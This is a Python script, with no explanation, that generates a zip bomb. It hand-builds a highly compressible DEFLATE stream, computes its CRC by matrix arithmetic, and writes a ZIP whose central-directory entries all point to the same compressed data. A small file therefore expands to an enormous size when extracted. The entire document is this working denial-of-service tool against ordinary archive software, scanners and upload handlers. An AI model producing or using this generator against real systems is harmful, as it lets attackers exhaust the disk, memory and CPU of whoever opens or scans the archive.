from struct import pack, error
def mxv(m, v): # matrix x vector
    r = 0
    for shift in range(len(m)):
        if (v>>shift) & 1: r ^= m[shift]
    return r
def l2h(sym_lengths): # length to huffman code
    bl_count, max_length = {}, 0
    for _, length in sym_lengths.items():
        bl_count.setdefault(length, 0)
        bl_count[length] += 1
        max_length = max(max_length, length)
    next_code, code = {}, 0
    for length in range(max_length):
        code = (code + bl_count.get(length, 0)) << 1
        next_code[length + 1] = code
    result = {}
    for sym, length in sorted(sym_lengths.items(), key=lambda x: (x[1], x[0])):
        result[sym] = next_code[length], length
        next_code[length] += 1
    return result
class BitBuffer:
    def __init__(self):
        self.done = []
        self.current = 0
        self.bit_pos = 0
    def push(self, x, n):
        while n >= (8 - self.bit_pos):
            self.current |= (x << self.bit_pos) & 0xff
            x >>= (8 - self.bit_pos)
            n -= (8 - self.bit_pos)
            self.done.append(self.current)
            self.current = 0
            self.bit_pos = 0
        self.current |= (x << self.bit_pos) & 0xff
        self.bit_pos += n
    def push_rev(self, x, n):
        mask = (1<<n)>>1
        while mask > 0:
            self.push(x&mask and 1 or 0, 1)
            mask >>= 1
    def bytes(self):
        out = bytes(self.done)
        if self.bit_pos: out += bytes([self.current])
        return out
def make_zip(f, num_files, compressed_size):
    CRC_M0 = [0xedb88320] + [1<<shift for shift in range(31)] + [1<<32]
    CRC_M1 = [mxv(CRC_M0, v) for v in [1<<shift for shift in range(32)] + [(1<<32) + 1]]
    code_length_lengths = {0: 2, 1: 3, 2: 3, 18: 1}
    code_length_codes = l2h(code_length_lengths)
    ll_lengths = {97: 2, 256: 2, 285: 1}
    ll_codes = l2h(ll_lengths)
    distance_lengths = {0: 1}
    distance_codes = l2h(distance_lengths)
    bits = BitBuffer()
    bits.push(0b1, 1)
    bits.push(0b10, 2)
    bits.push(max(ll_lengths) + 1 - 257, 5)
    bits.push(max(distance_lengths) + 1 - 1, 5)
    CODE_LENGTH_ALPHABET = (16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15)
    num_code_length_codes = max(CODE_LENGTH_ALPHABET.index(sym) for sym in code_length_lengths) + 1
    bits.push(num_code_length_codes - 4, 4)
    for code_length in CODE_LENGTH_ALPHABET[:num_code_length_codes]:
        bits.push(code_length_lengths.get(code_length, 0), 3)
    def skip(n):
        while n >= 11:
            if n < 138: x = n
            elif n < 138 + 11 and code_length_lengths[18] < (n - 138) * code_length_lengths[0]: x = n - 11
            else: x = 138
            bits.push_rev(*code_length_codes[18])
            bits.push(x - 11, 7)
            n -= x
        while n > 0:
            bits.push_rev(*code_length_codes[0])
            n -= 1
    def output_code_length_tree(sym_lengths):
        cur = 0
        for sym, length in sorted(sym_lengths.items()):
            skip(sym - cur)
            bits.push_rev(*code_length_codes[length])
            cur = sym + 1
    output_code_length_tree(ll_lengths)
    output_code_length_tree(distance_lengths)
    n = 0
    bits.push_rev(*ll_codes[97])
    n += 1
    is_even = bits.bit_pos % 2 == 0
    n += (8 - bits.bit_pos + 1) // 2 * 258
    prefix = bits.bytes()
    bits = BitBuffer()
    if not is_even: bits.push(*distance_codes[0])
    while bits.bit_pos + ll_lengths[285] + distance_lengths[0] + ll_lengths[256] <= 8:
        bits.push_rev(*ll_codes[285])
        bits.push(*distance_codes[0])
        n += 258
    bits.push_rev(*ll_codes[256])
    suffix = bits.bytes()
    num_zeroes = compressed_size - len(prefix) - len(suffix)
    n += num_zeroes * 1032
    body = b"\x00" * num_zeroes
    compressed_data = prefix + body + suffix
    N = n
    accum = [1<<shift for shift in range(33)]
    for shift in range(8): accum = [mxv([CRC_M0, CRC_M1][(97>>shift)&1], v) for v in accum]
    m = [1<<shift for shift in range(33)]
    while n > 0:
        if n & 1: m = [mxv(m, v) for v in accum]
        accum = [mxv(accum, v) for v in accum]
        n >>= 1
    kernel, n, crc_matrix = compressed_data, n, m
    central_directory = []
    offset = 0
    main_crc = (mxv(crc_matrix, 0x1ffffffff) & 0xffffffff) ^ 0xffffffff
    main_file_offset = offset
    try: offset += f.write(pack("<LHHHHHLLLHH", 0x04034b50, 20, 0, 8, 0x6ca0, 0x0548, main_crc, len(kernel), N, 1, 0) + b'0')
    except error:
        raise ValueError("Please choose size of 15Kb or more")
    offset += f.write(kernel)
    cd_offset = offset
    for cd_header in central_directory: offset += f.write(cd_header.serialize(zip64=0))
    for i in range(num_files):
        letters = []
        while True:
            letters.insert(0, b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"[i % 36])
            i = i // 36 - 1
            if i < 0: break
        offset += f.write(pack("<LHHHHHHLLLHHHHHLL", 0x02014b50, 20, 20, 0, 8, 0x6ca0, 0x0548, main_crc, len(kernel), N, len(bytes(letters)), 0, 0, 0, 0, 0, main_file_offset) + bytes(letters))
    cd_size = offset - cd_offset
    offset += f.write(pack("<LHHHHLLH", 0x06054b50, 0, 0, len(central_directory) + num_files, len(central_directory) + num_files, cd_size, cd_offset, 0))
    return offset
